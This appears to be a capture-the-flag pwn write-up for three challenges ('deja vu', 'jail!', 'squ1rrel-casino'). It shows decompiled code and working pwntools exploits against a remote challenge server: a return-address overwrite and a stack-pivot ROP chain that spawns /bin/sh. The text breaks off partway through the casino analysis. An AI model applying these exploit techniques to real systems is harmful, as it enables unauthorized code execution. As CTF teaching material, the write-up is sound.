
1. deja vu
2. jail!
3. squ1rrel-casino

--- 
# deja vu

```bash
[*] '/mnt/d/squ1rrel/deja vu/prob'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Partial RELRO, No canary, No PIE

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE v4[64]; // [rsp+0h] [rbp-40h] BYREF

  setbuf(_bss_start, 0LL);
  setbuf(stdin, 0LL);
  printf("pwnme: ");
  gets(v4);
  return 0;
}
```

So easy prob. It has `bof` vuln. Even,

```C
int win()
{
  char s[8]; // [rsp+0h] [rbp-70h] BYREF
  __int64 v2; // [rsp+8h] [rbp-68h]
  __int64 v3; // [rsp+10h] [rbp-60h]
  __int64 v4; // [rsp+18h] [rbp-58h]
  __int64 v5; // [rsp+20h] [rbp-50h]
  __int64 v6; // [rsp+28h] [rbp-48h]
  __int64 v7; // [rsp+30h] [rbp-40h]
  __int64 v8; // [rsp+38h] [rbp-38h]
  __int64 v9; // [rsp+40h] [rbp-30h]
  __int64 v10; // [rsp+48h] [rbp-28h]
  __int64 v11; // [rsp+50h] [rbp-20h]
  __int64 v12; // [rsp+58h] [rbp-18h]
  int v13; // [rsp+60h] [rbp-10h]
  FILE *stream; // [rsp+68h] [rbp-8h]

  *(_QWORD *)s = 0LL;
  v2 = 0LL;
  v3 = 0LL;
  v4 = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  v7 = 0LL;
  v8 = 0LL;
  v9 = 0LL;
  v10 = 0LL;
  v11 = 0LL;
  v12 = 0LL;
  v13 = 0;
  puts("You got it!!");
  stream = fopen("flag.txt", "r");
  if ( !stream )
    return puts("Error: Could not open flag.txt (create this file for testing)");
  fgets(s, 100, stream);
  printf("%s", s);
  return fclose(stream);
}
```

It has `win` function. Do `Return Address Overwrite`(`RAO?`).

# exploit

```python
from pwn import *

p = remote('20.84.72.194', 5000)
e = ELF('./prob')

p.sendlineafter(b': ', b'a' * 0x48 + p64(e.sym['win']))
p.interactive()
```

---

# jail!

```bash
[*] '/mnt/d/squ1rrel/jail!/prison'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Partial RELRO, NO PIE

```
prison: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=11861526f4bb256264011fa2e0118c82e3b99e2c, for GNU/Linux 3.2.0, not stripped
```

`statically linked`. So, It has many gadgets like `pop rax, rdi, rsi, rdx` or `syscall` etc..

```C
__int64 __fastcall prison(__int64 a1, int a2, int a3, int a4, int a5, int a6)
{
  int v6; // edx
  int v7; // ecx
  int v8; // r8d
  int v9; // r9d
  __int64 result; // rax
  int v11; // ecx
  int v12; // r8d
  int v13; // r9d
  int v14; // esi
  int v15; // edx
  int v16; // ecx
  int v17; // r8d
  int v18; // r9d
  _QWORD v19[7]; // [rsp+0h] [rbp-80h]
  int v20; // [rsp+3Ch] [rbp-44h] BYREF
  _BYTE v21[64]; // [rsp+40h] [rbp-40h] BYREF

  v19[1] = "Empty Cell";
  v19[2] = "Jay. L. Thyme";
  v19[3] = "Jay. L. Thyme's Wife";
  v19[4] = "Jay. L. Thyme's Wife's Boyfriend";
  v19[5] = "Rob Banks";
  printf(
    (unsigned int)"They gave you the premium stay so at least you get to choose your cell (1-6): ",
    a2,
    a3,
    a4,
    a5,
    a6);
  if ( (unsigned int)_isoc99_scanf((unsigned int)"%d", (unsigned int)&v20, v6, v7, v8, v9, (char)"The Professor") == 1 )
  {
    while ( (unsigned int)getchar() != 10 )
      ;
    v14 = v20;
    printf((unsigned int)"Cell #%d: Your cellmate is %s\n", v20, v19[v20 - 1], v11, v12, v13);
    printf((unsigned int)"Now let's get the registry updated. What is your name: ", v14, v15, v16, v17, v18);
    fgets(v21, 100LL, stdin);
    puts("...");
    sleep(3LL);
    puts("...");
    return puts("What did you expect. You're in here for life this is what it looks like for the rest.");
  }
  else
  {
    puts("Invalid input!");
    do
      result = getchar();
    while ( (_DWORD)result != 10 );
  }
  return result;
}
```

Since it doesn't check `v20`, it has `oob` vuln, but anyway I didn't use this vuln.
It also has `bof` vuln. I can use various gadget, so I exploit it with `stack pivoting` and `syscall`.

# exploit

```python
from pwn import *
from time import *

context.terminal = ['tmux', 'splitw', '-h']

#p = process('./prison')
p = remote('20.84.72.194', 5001)
e = ELF('./prison')

bss = 0x4d2500
syscall = 0x00000000004013b8
pop_rax = 0x000000000041f464
pop_rdi = 0x0000000000401a0d
xor_edi_rdi = 0x000000000047ddda
pop_rsi_rbp = 0x0000000000413676
pop_rdx = 0x0000000000401a1a
leave = 0x0000000000401b54

p.sendlineafter(b': ', b'1')
payload = b'a' * 64 + p64(bss + 0x40) + p64(0x401b05)
p.sendlineafter(b'name: ', payload)

sleep(4)
payload = p64(xor_edi_rdi) + p64(pop_rsi_rbp) + p64(bss + 0x100) + p64(bss + 0x100) + p64(pop_rdx) + p64(0x100) + p64(e.sym['read']) + p64(leave)
payload += p64(bss - 8) + p64(leave)
#gdb.attach(p)
p.sendline(payload)

sleep(4)
payload = b'/bin/sh\x00' + p64(pop_rdi) + p64(bss + 0x100) + p64(pop_rsi_rbp) + p64(0) + p64(0) + p64(pop_rdx) + p64(0) + p64(pop_rax) + p64(0x3b) + p64(syscall)
p.send(payload)
p.interactive()
```

---
# squ1rrel-casino

```bash
[*] '/mnt/d/squ1rrel/squ1rrel-casino/casino'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Partial RELRO

```C
size_t initialize_game()
{
  size_t result; // rax

  player = 100;
  dword_40A4 = 0;
  printf("Enter your name: ");
  result = (size_t)fgets(byte_40A8, 64, stdin);
  if ( result )
  {
    result = strcspn(byte_40A8, "\n");
    byte_40A8[result] = 0;
  }
  return result;
}
```

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  int v5; // [rsp+Ch] [rbp-34h] BYREF
  time_t timer; // [rsp+10h] [rbp-30h] BYREF
  struct tm *v7; // [rsp+18h] [rbp-28h]
  timeval tv; // [rsp+20h] [rbp-20h] BYREF
  unsigned __int64 v9; // [rsp+38h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  setbuf(_bss_start, 0LL);
  setbuf(stdin, 0LL);
  v3 = time(0LL);
  srand(v3);
  initialize_game();
  while ( 1 )
  {
    while ( 1 )
    {
      puts("\n=== Squ1rrel Casino Menu ===");
      puts("1. Play Blackjack");
      puts("2. Show Balance");
      puts("3. Exit");
      printf("Choose an option: ");
      if ( (unsigned int)__isoc99_scanf("%d", &v5) == 1 )
        break;
      puts("Invalid input!");
      while ( getchar() != 10 )
        ;
    }
    while ( getchar() != 10 )
      ;
    if ( v5 == 3 )
      break;
    if ( v5 > 3 )
      goto LABEL_15;
    if ( v5 == 1 )
    {
      play_blackjack();
    }
    else if ( v5 == 2 )
    {
      show_balance();
    }
    else
    {
LABEL_15:
      puts("Invalid option!");
    }
  }
  puts("Thanks for playing at the Squ1rrel Casino!");
  gettimeofday(&tv, 0LL);
  timer = tv.tv_sec;
  v7 = localtime(&timer);
  printf("But it's only %02d:%02d! Surely you can stay longer?\n", v7->tm_hour, v7->tm_min);
  return 0;
}
```

`main` play 